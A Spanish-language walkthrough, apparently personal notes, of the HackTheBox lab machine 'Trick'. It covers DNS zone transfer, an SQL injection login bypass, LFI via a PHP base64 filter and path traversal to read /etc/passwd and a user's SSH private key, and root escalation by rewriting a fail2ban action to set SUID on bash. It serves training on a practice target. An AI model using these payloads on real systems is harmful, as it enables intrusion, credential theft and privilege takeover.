
--------
- Puertos abiertos TCP : 22, 25, 53, 80
- Maquina Easy 
-  #dns 
-----


- Entramos en la IP pero no hay nada interesante

- Fuzzeamos dominios subdominios y por extensiones pero no encontramos nada

- Al tener el puerto 53 abierto hacemos un escaneo de [[DNS]] con ``dnslookup`` vemos el common name tricks.htb, lo guardamos en el ``/etc/hosts/``

![[tricks.png]]

- Seguimos enumerando el puerto 53, con #dig [[DNS]] lanzamos un ataque de transferencia de zona y encontramos un subdominio, lo añadimos al ``/etc/hosts``

````
dig 10.10.11.166 trick.htb axfr
`````

![[igjreiigjer.png]]

- Entramos al subdominio y nos encontramos un login al cual accedemos al panel de administrador con una inyeccion SQL basica

````
'or 1=1-- -
`````


![[bgfbfbgfbfg 1.png]]

![[rgergloihl.png]]

- Antes de seguir enumerando el panel de administracion vamos a averiguar la contraseña del usuario administrator

- Nos vamos a la pestaña Users , hacemos click en Action - Edit y nos aparece las password, para verla en texto claro hacemos un Ctrl + Shift + I Hacemos click encima de las password,  borramos la palabra password del campo type y nos aparecera en texto claro


![[Pasted image 20230720204420.png]]

- Despues de probar diferentes injecciones en la url sin conseguir nada vemos que podemos injectarle un filtro para que nos represente en base64 la informacion, apuntamos al home y nos aparece una cadena en base64

![[Pasted image 20230720211103.png]]

- Decodeamos esta cadena y vemos un archivo de una base de datos que puede contener credenciales

![[Pasted image 20230720210946.png]]

- Apuntamos a dicho archivo con el filtro de base64 y obtenemos otra cadena en base64

![[Pasted image 20230720211304.png]]

- Decodeamos la cadena y vemos un usuario y una contraseña

![[Pasted image 20230720211503.png]]

- Enumeramos subdominios con wfuzz y encontramos marketing, lo añadimos al ``/etc/hosts``

````
wfuzz -c -t 20 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: preprod-FUZZ.trick.htb" http://trick.htb
`````

- Entramos en la url y pobamos un LFI con un path traversal y podemos leer el /etc/passwd, podemos hacer un cntrl + u para verlo mejor

- Vemos un usuario michael

![[Pasted image 20230720221749.png]]

- Enumeramos si el usuario es valido conectandonos al puerto 25 con [[Telnet]] para ver si el usuario michael es valido y nos conecta por lo tanto es valido

- Tambien podemos enumeralo con la herramienta ``smtp-user-enum`` pero tarda demasiado

![[Pasted image 20230720222433.png]]

- Para enumerar mejor la maquina nos la traemos a nuestro pc con [[Curl]] y listamos los puertos abiertos internamente en la maquina

````
curl -s -X GET "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//proc/net/tcp"
`````

![[Pasted image 20230720225425.png]]


- Pasamos los puertos de [[Hexadecimal]] a texto claro

````
sort -u | while read port; do echo "[+] Puerto $port -> $((16#$port))"; done
`````

![[Pasted image 20230720225738.png]]

- Probamos a listar la clave privada de ssh del usuario michael y encontramos una id_rsa, le damos permisos 600 y ganamos acceso al sistema

````
curl -s -X GET "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa"
`````

![[Pasted image 20230720233411.png]]

````
ssh -i id_rsa michael@10.10.11.166
`````

- Buscamos la flag de user.txt

# Escalada de privilegios


- Hacemos un ``sudo -l`` y vemos que tengo permiso para reiniciar el servicio de ``fail2ban`` 

![[Pasted image 20230721001814.png]]

- Configuramos la regla de ip_tables de fail2ban para que cuando nos banee le de permiso de suid a la bash

- Como no tenemos permisos de escritura en el archivo correspondiente cambiamos de nombre el archivo ``/etc/fail2ban/action.d/iptables-multiport.conf`` a ``/etc/fail2ban/action.d/iptables-multiport.bak`` 

- Ahora hacemos una copia del archivo ``/etc/fail2ban/action.d/iptables-multiport.bak`` y lo llamamos como el archivo original ``/etc/fail2ban/action.d/iptables-multiport.conf`` y asi ya tendriamos permisos de escritura para modificarlo

- En el archivo que hemos creado buscamos la siguiente linea y substitumos su contenido para cuando me banee como para cuando me desbanee le de permisos suid a la bash 

````
chmod u+s /bin/bash
`````

![[Pasted image 20230721003243.png]]

- Reiniciamos el servicio y monitorizamos cada segundo la ``/bin/bash`` para ver cuando cambia a suid

````
sudo /etc/init.d/fail2ban restart
`````

````
watch -n 1 ls -l /bin/bash
`````

- Nos auttentticamos varias veces por ssh para que nos banee y nos atorgaria permisos a las bash

- 10 vecesseguidas

````
seq 1 10 | xargs -P 50 -I{} sshpass -p '123' ssh michael@10.10.11.166
`````

- De 1 en 1

````
sshpass -p '1234' ssh michael@10.10.11.166
`````

- Nos lanzamos la bash con superusuario 

````
bash -p
`````

- Buscamos la flag de root.txt


